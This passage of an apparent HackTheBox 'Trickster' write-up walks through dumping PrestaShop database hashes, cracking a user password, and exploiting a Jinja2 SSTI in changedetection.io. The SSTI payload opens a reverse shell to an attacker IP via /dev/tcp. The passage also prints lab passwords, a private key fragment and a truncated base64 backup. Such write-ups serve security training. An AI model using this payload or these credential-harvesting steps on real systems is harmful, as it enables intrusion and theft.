1rL84VgMslIiHipP6fAlBXwjQ19TdMFWRUV4LEFotdJavfo2kMpc0l/ZsYF7cAq6
fdX0c9dGWCsKP8LJWRk4OgmFlx1deCjy7KhT9W/fwv9Fj08wrj2LKXk20n6x3yRz
O/wWZk3wxvJQD0XS23Aav9b0u1LBoV68m1WCP+MHAoGBANwjGWnrY6TexCRzKdOQ
K/cEIFYczJn7IB/zbB1SEC19vRT5ps89Z25BOu/hCVRhVg9bb5QslLSGNPlmuEpo
HfSWR+q1UdaEfABY59ZsFSuhbqvC5gvRZVQ55bPLuja5mc/VvPIGT/BGY7lAdEbK
6SMIa53I2hJz4IMK4vc2Ssqq
-----END PRIVATE KEY-----
',
  ),
);
```

| Username | Password     | Database   |
| -------- | ------------ | ---------- |
| ps_user  | prest@shop_o | prestashop |

## Privilege Escalation to james
### Database Enumeration

In order to `escalate our privileges` to `james` we started `enumerating` the `database`.

```c
www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 843
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

No entry for terminal type "term-256color";
using dumb terminal settings.
No entry for terminal type "term-256color";
using dumb terminal settings.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```c
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)
```

```c
MariaDB [(none)]> use prestashop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```c
MariaDB [prestashop]> show tables;
+-------------------------------------------------+
| Tables_in_prestashop                            |
+-------------------------------------------------+
| ps_access                                       |
| ps_accessory                                    |
| ps_address                                      |
| ps_address_format                               |
| ps_admin_filter                                 |
| ps_alias                                        |
| ps_api_access                                   |
| ps_attachment                                   |
| ps_attachment_lang                              |
| ps_attribute                                    |
| ps_attribute_group                              |
| ps_attribute_group_lang                         |
| ps_attribute_group_shop                         |
| ps_attribute_lang                               |
| ps_attribute_shop                               |
| ps_authorization_role                           |
| ps_authorized_application                       |
| ps_blockwishlist_statistics                     |
| ps_carrier                                      |
| ps_carrier_group                                |
| ps_carrier_lang                                 |
| ps_carrier_shop                                 |
| ps_carrier_tax_rules_group_shop                 |
| ps_carrier_zone                                 |
| ps_cart                                         |
| ps_cart_cart_rule                               |
| ps_cart_product                                 |
| ps_cart_rule                                    |
| ps_cart_rule_carrier                            |
| ps_cart_rule_combination                        |
| ps_cart_rule_country                            |
| ps_cart_rule_group                              |
| ps_cart_rule_lang                               |
| ps_cart_rule_product_rule                       |
| ps_cart_rule_product_rule_group                 |
| ps_cart_rule_product_rule_value                 |
| ps_cart_rule_shop                               |
| ps_category                                     |
| ps_category_group                               |
| ps_category_lang                                |
| ps_category_product                             |
| ps_category_shop                                |
| ps_cms                                          |
| ps_cms_category                                 |
| ps_cms_category_lang                            |
| ps_cms_category_shop                            |
| ps_cms_lang                                     |
| ps_cms_role                                     |
| ps_cms_role_lang                                |
| ps_cms_shop                                     |
| ps_configuration                                |
| ps_configuration_kpi                            |
| ps_configuration_kpi_lang                       |
| ps_configuration_lang                           |
| ps_connections                                  |
| ps_connections_page                             |
| ps_connections_source                           |
| ps_contact                                      |
| ps_contact_lang                                 |
| ps_contact_shop                                 |
| ps_country                                      |
| ps_country_lang                                 |
| ps_country_shop                                 |
| ps_currency                                     |
| ps_currency_lang                                |
| ps_currency_shop                                |
| ps_customer                                     |
| ps_customer_group                               |
| ps_customer_message                             |
| ps_customer_message_sync_imap                   |
| ps_customer_session                             |
| ps_customer_thread                              |
| ps_customization                                |
| ps_customization_field                          |
| ps_customization_field_lang                     |
| ps_customized_data                              |
| ps_date_range                                   |
| ps_delivery                                     |
| ps_emailsubscription                            |
| ps_employee                                     |
| ps_employee_session                             |
| ps_employee_shop                                |
| ps_feature                                      |
| ps_feature_flag                                 |
| ps_feature_lang                                 |
| ps_feature_product                              |
| ps_feature_shop                                 |
| ps_feature_value                                |
| ps_feature_value_lang                           |
| ps_ganalytics                                   |
| ps_ganalytics_data                              |
| ps_gender                                       |
| ps_gender_lang                                  |
| ps_group                                        |
| ps_group_lang                                   |
| ps_group_reduction                              |
| ps_group_shop                                   |
| ps_gsitemap_sitemap                             |
| ps_guest                                        |
| ps_homeslider                                   |
| ps_homeslider_slides                            |
| ps_homeslider_slides_lang                       |
| ps_hook                                         |
| ps_hook_alias                                   |
| ps_hook_module                                  |
| ps_hook_module_exceptions                       |
| ps_image                                        |
| ps_image_lang                                   |
| ps_image_shop                                   |
| ps_image_type                                   |
| ps_import_match                                 |
| ps_info                                         |
| ps_info_lang                                    |
| ps_info_shop                                    |
| ps_lang                                         |
| ps_lang_shop                                    |
| ps_layered_category                             |
| ps_layered_filter                               |
| ps_layered_filter_block                         |
| ps_layered_filter_shop                          |
| ps_layered_indexable_attribute_group            |
| ps_layered_indexable_attribute_group_lang_value |
| ps_layered_indexable_attribute_lang_value       |
| ps_layered_indexable_feature                    |
| ps_layered_indexable_feature_lang_value         |
| ps_layered_indexable_feature_value_lang_value   |
| ps_layered_price_index                          |
| ps_layered_product_attribute                    |
| ps_link_block                                   |
| ps_link_block_lang                              |
| ps_link_block_shop                              |
| ps_linksmenutop                                 |
| ps_linksmenutop_lang                            |
| ps_log                                          |
| ps_mail                                         |
| ps_mailalert_customer_oos                       |
| ps_manufacturer                                 |
| ps_manufacturer_lang                            |
| ps_manufacturer_shop                            |
| ps_memcached_servers                            |
| ps_message                                      |
| ps_message_readed                               |
| ps_meta                                         |
| ps_meta_lang                                    |
| ps_module                                       |
| ps_module_access                                |
| ps_module_carrier                               |
| ps_module_country                               |
| ps_module_currency                              |
| ps_module_group                                 |
| ps_module_history                               |
| ps_module_preference                            |
| ps_module_shop                                  |
| ps_operating_system                             |
| ps_order_carrier                                |
| ps_order_cart_rule                              |
| ps_order_detail                                 |
| ps_order_detail_tax                             |
| ps_order_history                                |
| ps_order_invoice                                |
| ps_order_invoice_payment                        |
| ps_order_invoice_tax                            |
| ps_order_message                                |
| ps_order_message_lang                           |
| ps_order_payment                                |
| ps_order_return                                 |
| ps_order_return_detail                          |
| ps_order_return_state                           |
| ps_order_return_state_lang                      |
| ps_order_slip                                   |
| ps_order_slip_detail                            |
| ps_order_state                                  |
| ps_order_state_lang                             |
| ps_orders                                       |
| ps_pack                                         |
| ps_page                                         |
| ps_page_type                                    |
| ps_page_viewed                                  |
| ps_pagenotfound                                 |
| ps_product                                      |
| ps_product_attachment                           |
| ps_product_attribute                            |
| ps_product_attribute_combination                |
| ps_product_attribute_image                      |
| ps_product_attribute_lang                       |
| ps_product_attribute_shop                       |
| ps_product_carrier                              |
| ps_product_comment                              |
| ps_product_comment_criterion                    |
| ps_product_comment_criterion_category           |
| ps_product_comment_criterion_lang               |
| ps_product_comment_criterion_product            |
| ps_product_comment_grade                        |
| ps_product_comment_report                       |
| ps_product_comment_usefulness                   |
| ps_product_country_tax                          |
| ps_product_download                             |
| ps_product_group_reduction_cache                |
| ps_product_lang                                 |
| ps_product_sale                                 |
| ps_product_shop                                 |
| ps_product_supplier                             |
| ps_product_tag                                  |
| ps_profile                                      |
| ps_profile_lang                                 |
| ps_psgdpr_consent                               |
| ps_psgdpr_consent_lang                          |
| ps_psgdpr_log                                   |
| ps_psreassurance                                |
| ps_psreassurance_lang                           |
| ps_quick_access                                 |
| ps_quick_access_lang                            |
| ps_range_price                                  |
| ps_range_weight                                 |
| ps_request_sql                                  |
| ps_required_field                               |
| ps_risk                                         |
| ps_risk_lang                                    |
| ps_search_engine                                |
| ps_search_index                                 |
| ps_search_word                                  |
| ps_shop                                         |
| ps_shop_group                                   |
| ps_shop_url                                     |
| ps_smarty_cache                                 |
| ps_smarty_last_flush                            |
| ps_smarty_lazy_cache                            |
| ps_specific_price                               |
| ps_specific_price_priority                      |
| ps_specific_price_rule                          |
| ps_specific_price_rule_condition                |
| ps_specific_price_rule_condition_group          |
| ps_state                                        |
| ps_statssearch                                  |
| ps_stock                                        |
| ps_stock_available                              |
| ps_stock_mvt                                    |
| ps_stock_mvt_reason                             |
| ps_stock_mvt_reason_lang                        |
| ps_store                                        |
| ps_store_lang                                   |
| ps_store_shop                                   |
| ps_supplier                                     |
| ps_supplier_lang                                |
| ps_supplier_shop                                |
| ps_supply_order                                 |
| ps_supply_order_detail                          |
| ps_supply_order_history                         |
| ps_supply_order_receipt_history                 |
| ps_supply_order_state                           |
| ps_supply_order_state_lang                      |
| ps_tab                                          |
| ps_tab_lang                                     |
| ps_tab_module_preference                        |
| ps_tag                                          |
| ps_tag_count                                    |
| ps_tax                                          |
| ps_tax_lang                                     |
| ps_tax_rule                                     |
| ps_tax_rules_group                              |
| ps_tax_rules_group_shop                         |
| ps_timezone                                     |
| ps_translation                                  |
| ps_warehouse                                    |
| ps_warehouse_carrier                            |
| ps_warehouse_product_location                   |
| ps_warehouse_shop                               |
| ps_web_browser                                  |
| ps_webservice_account                           |
| ps_webservice_account_shop                      |
| ps_webservice_permission                        |
| ps_wishlist                                     |
| ps_wishlist_product                             |
| ps_wishlist_product_cart                        |
| ps_zone                                         |
| ps_zone_shop                                    |
+-------------------------------------------------+
276 rows in set (0.001 sec)
```

And at the end we found some `hashes`.

```c
MariaDB [prestashop]> select * from ps_employee \G;     
*************************** 1. row ***************************
             id_employee: 1
              id_profile: 1
                 id_lang: 1
                lastname: Store
               firstname: Trickster
                   email: admin@trickster.htb
                  passwd: $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
         last_passwd_gen: 2024-05-25 13:10:20
         stats_date_from: 2024-04-25
           stats_date_to: 2024-05-25
      stats_compare_from: 0000-00-00
        stats_compare_to: 0000-00-00
    stats_compare_option: 1
    preselect_date_range: NULL
                bo_color: NULL
                bo_theme: default
                  bo_css: theme.css
             default_tab: 1
                bo_width: 0
                 bo_menu: 1
                  active: 1
                   optin: NULL
           id_last_order: 5
id_last_customer_message: 0
        id_last_customer: 0
    last_connection_date: 2024-09-21
    reset_password_token: NULL
 reset_password_validity: 0000-00-00 00:00:00
    has_enabled_gravatar: 0
*************************** 2. row ***************************
             id_employee: 2
              id_profile: 2
                 id_lang: 0
                lastname: james
               firstname: james
                   email: james@trickster.htb
                  passwd: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
         last_passwd_gen: 2024-09-09 13:22:42
         stats_date_from: NULL
           stats_date_to: NULL
      stats_compare_from: NULL
        stats_compare_to: NULL
    stats_compare_option: 1
    preselect_date_range: NULL
                bo_color: NULL
                bo_theme: NULL
                  bo_css: NULL
             default_tab: 0
                bo_width: 0
                 bo_menu: 1
                  active: 0
                   optin: NULL
           id_last_order: 0
id_last_customer_message: 0
        id_last_customer: 0
    last_connection_date: NULL
    reset_password_token: NULL
 reset_password_validity: NULL
    has_enabled_gravatar: 0
2 rows in set (0.000 sec)

ERROR: No query specified
```

| Hash                                                         |
| ------------------------------------------------------------ |
| $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |

### Cracking the Hash

The biggest chance of `cracking` was the `hash` of `james` so we started with his and got lucky indeed.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Trickster/files]
└─$ cat james_hash 
$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Trickster/files]
└─$ sudo john james_hash --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alwaysandforever (?)     
1g 0:00:00:05 DONE (2024-09-21 23:47) 0.1960g/s 7263p/s 7263c/s 7263C/s bandit2..alkaline
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Password         |
| ---------------- |
| alwaysandforever |

A quick `session switch` and we successfully `escalated our privileges` to `james`.

```c
www-data@trickster:~$ su james
Password: 
james@trickster:/var/www$
```

## user.txt

Within the user context of `james` we were able to grab the `user.txt`.

```c
james@trickster:~$ cat user.txt 
1088a5b01203b15a0b26f8a21bde3090
```

## Pivoting (james)

Now the process started from the beginning and we started `pivoting` through `james`. There were no special `groups` for the user.

```c
james@trickster:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

He also was not able to run anything using `sudo`.

```c
james@trickster:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on trickster.
```

But we found port `38003/TCP` open locally. Which was kinda odd.

```c
james@trickster:~$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:38003      0.0.0.0:*          
tcp   LISTEN 0      128             [::]:22            [::]:*
```

And inside `/opt` we got a `PrusaSlicer` folder which is a application for a `3D printer`.

```c
james@trickster:/opt$ ls -la
total 20
drwxr-xr-x  5 root root 4096 Sep 13 12:24 .
drwxr-xr-x 20 root root 4096 Sep 13 12:24 ..
drwx--x--x  4 root root 4096 Sep 13 12:24 containerd
drwxr-xr-x  3 root root 4096 Sep 13 12:24 google
drwxr-xr-x  2 root root 4096 Sep 13 12:24 PrusaSlicer
```

We downloaded the `TRICKSTER.3mf` file for analysis.

```c
james@trickster:/opt/PrusaSlicer$ ls -la
total 82196
drwxr-xr-x 2 root root     4096 Sep 13 12:24 .
drwxr-xr-x 5 root root     4096 Sep 13 12:24 ..
-rwxr-xr-x 1 root root 84018368 Sep  6  2023 prusaslicer
-rw-r--r-- 1 root root   138526 May 23 22:08 TRICKSTER.3mf
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Trickster/files]
└─$ scp james@trickster.htb:/opt/PrusaSlicer/TRICKSTER.3mf .
james@trickster.htb's password: 
TRICKSTER.3mf
```

Since it was a simple `.zip archive` we just unzipped it and searched through the files.

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/unzip]
└─$ file TRICKSTER.3mf 
TRICKSTER.3mf: Zip archive data, at least v2.0 to extract, compression method=deflate
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/unzip]
└─$ unzip TRICKSTER.3mf 
Archive:  TRICKSTER.3mf
  inflating: [Content_Types].xml     
  inflating: Metadata/thumbnail.png  
  inflating: _rels/.rels             
  inflating: 3D/3dmodel.model        
  inflating: Metadata/Slic3r_PE.config  
  inflating: Metadata/Slic3r_PE_model.config
```

The `3dmodel.model` file contained a `version information` which we noted for later.

```c
┌──(kali㉿kali)-[/media/…/Trickster/files/unzip/3D]
└─$ cat 3dmodel.model 
<?xml version="1.0" encoding="UTF-8"?>
<model unit="millimeter" xml:lang="en-US" xmlns="http://schemas.microsoft.com/3dmanufacturing/core/2015/02" xmlns:slic3rpe="http://schemas.slic3r.org/3mf/2017/06">
 <metadata name="slic3rpe:Version3mf">1</metadata>
 <metadata name="Title">TRICKSTER</metadata>
 <metadata name="Designer"></metadata>
 <metadata name="Description">TRICKSTER</metadata>
 <metadata name="Copyright"></metadata>
 <metadata name="LicenseTerms"></metadata>
 <metadata name="Rating"></metadata>
 <metadata name="CreationDate">2024-05-23</metadata>
 <metadata name="ModificationDate">2024-05-23</metadata>
 <metadata name="Application">PrusaSlicer-2.6.1+win64</metadata>
 <resources>
```

| Version |
| ------- |
| 2.6.1   |

For now this was a dead end and we went back to the box to double check what's about the `containerd` folder inside `/opt`.

## Enumerating the containerized Application

We assumed that there was a container running and therefore we checked the `ARP table` to find indeed a `container` assigned with the `IP address` of `172.17.0.2`.

```c
james@trickster:~$ arp -a
? (172.17.0.2) at 02:42:ac:11:00:02 [ether] on docker0
? (10.129.0.1) at 00:50:56:b9:f8:ec [ether] on eth0
```

We forwarded the default port `5000/TCP` using `SSH` and accessed the `web application` on `http://127.0.0.1:5000/`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh james@trickster.htb -L 5000:172.17.0.2:5000
james@trickster.htb's password: 
Last login: Sat Sep 21 21:55:23 2024 from 10.10.14.119
james@trickster:~$
```

- [http://127.0.0.1:5000/](http://127.0.0.1:5000/)

![](images/2024-09-22_00-29_5000_website.png)

Thank's to `Password Reuse` the password of `james` worked here as well and we could login to the `CHANGEDETECTION.IO` application.

| Password         |
| ---------------- |
| alwaysandforever |

![](images/2024-09-22_00-30_5000_dashboard.png)

## Server-Side Template Injection (SSTI)

We found out that the `notification` used `Jinja2` as `syntax` and could be potentially vulnerable to `Server-Side Template Injection (SSTI)`.

![](images/2024-09-22_00-33_5000_edit.png)

With the following `payload` for the `Notification URL List` and the `Server-Side Template Injection (SSTI) Payload` we prepared the `code execution`.

Notification URL List:

```c
get://ip/foobar
```

Notification Body:

```c
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').popen("/bin/bash -c '/bin/bash &>/dev/tcp/10.10.14.119/4444 0>&1'").read()}}
{% endif %}
{% endfor %}
```

![](images/2024-09-22_01-08_5000_exploit_preparation.png)

Then we executed it to test for the notification and got a `callback` which put us into a shell as `root` inside the `container`.

![](images/2024-09-22_01-09_5000_trigger_exploit_notification.png)

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.119] from (UNKNOWN) [10.129.188.199] 37272
id
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation to root (unintended)

After a little bit of enumeration we found out that the `.bash_history` was not linked to `/dev/null` and therefore readable. Inside we found a `password` which conveniently matched for `root` on the `host system`.

```c
pwd
/root
cat .bash_history
apt update
#YouC4ntCatchMe#
apt-get install libcap2-bin
capsh --print
clear
capsh --print
cd changedetectionio/
ls
nano forms.py 
apt install nano
nano forms.py 
exit
capsh --print
nano
cd changedetectionio/
nano forms.py 
exit
nano changedetectionio/flask_app.py 
exit
nano changedetectionio/flask_app.py 
exit
nano changedetectionio/flask_app.py 
nano changedetectionio/static/js/notifications.js 
exit
```

| Password         |
| ---------------- |
| #YouC4ntCatchMe# |

```c
james@trickster:~$ su root
Password: 
root@trickster:/home/james#
```

## Privilege Escalation to adam

The intentional way was obviously not that easy and so we assumed that we had to `escalate our privileges` even further to `adam`.

The `/datastore` folder inside `/` was something we spotted right away because it was an unusual folder to be there.

```c
root@ae5c137aa8ef:/app# ls -la /
total 76
drwxr-xr-x   1 root root 4096 Sep 13 12:24 .
drwxr-xr-x   1 root root 4096 Sep 13 12:24 ..
-rwxr-xr-x   1 root root    0 Sep 10 09:18 .dockerenv
drwxr-xr-x   1 root root 4096 Sep 22 10:53 app
lrwxrwxrwx   1 root root    7 Apr  8 00:00 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Sep 13 12:24 boot
drwxr-xr-x   5 root root 4096 Sep 22 10:40 datastore
drwxr-xr-x   5 root root  340 Sep 22 10:40 dev
drwxr-xr-x   1 root root 4096 Sep 13 12:24 etc
drwxr-xr-x   2 root root 4096 Sep 13 12:24 home
lrwxrwxrwx   1 root root    7 Apr  8 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr  8 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Sep 13 12:24 media
drwxr-xr-x   2 root root 4096 Sep 13 12:24 mnt
drwxr-xr-x   2 root root 4096 Sep 13 12:24 opt
dr-xr-xr-x 337 root root    0 Sep 22 10:40 proc
drwx------   1 root root 4096 Sep 22 09:30 root
drwxr-xr-x   1 root root 4096 Sep 22 10:53 run
lrwxrwxrwx   1 root root    8 Apr  8 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Sep 13 12:24 srv
dr-xr-xr-x  13 root root    0 Sep 22 10:40 sys
drwxrwxrwt   1 root root 4096 Sep 22 10:53 tmp
drwxr-xr-x   1 root root 4096 Sep 13 12:24 usr
drwxr-xr-x   1 root root 4096 Sep 13 12:24 var
```

It contained a `Backups` folder which itself contained two `.zip` files.

```c
root@ae5c137aa8ef:/datastore# ls -la
total 48
drwxr-xr-x 5 root root  4096 Sep 22 10:40 .
drwxr-xr-x 1 root root  4096 Sep 13 12:24 ..
drwxr-xr-x 2 root root  4096 Aug 31 08:56 Backups
drwxr-xr-x 2 root root  4096 Sep 19 11:44 b86f1003-3ecb-4125-b090-27e15ca605b9
drwxr-xr-x 2 root root  4096 Sep 19 11:44 bbdd78f6-db98-45eb-9e7b-681a0c60ea34
-rw-r--r-- 1 root root    64 Aug 30 20:21 secret.txt
-rw-r--r-- 1 root root   155 Aug 30 20:25 url-list-with-tags.txt
-rw-r--r-- 1 root root    73 Aug 30 20:25 url-list.txt
-rw-r--r-- 1 root root 14041 Sep 22 10:40 url-watches.json
```

```c
root@ae5c137aa8ef:/datastore/Backups# ls -la
total 52
drwxr-xr-x 2 root root  4096 Aug 31 08:56 .
drwxr-xr-x 5 root root  4096 Sep 22 10:40 ..
-rw-r--r-- 1 root root  6221 Aug 31 08:53 changedetection-backup-20240830194841.zip
-rw-r--r-- 1 root root 33708 Aug 30 20:25 changedetection-backup-20240830202524.zip
```

We downloaded them to have a  closer look onto them.

```c
root@ae5c137aa8ef:/datastore/Backups# cat changedetection-backup-20240830194841.zip | base64 > backup.b64
```

```c
root@ae5c137aa8ef:/datastore/Backups# cat backup.txt 
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
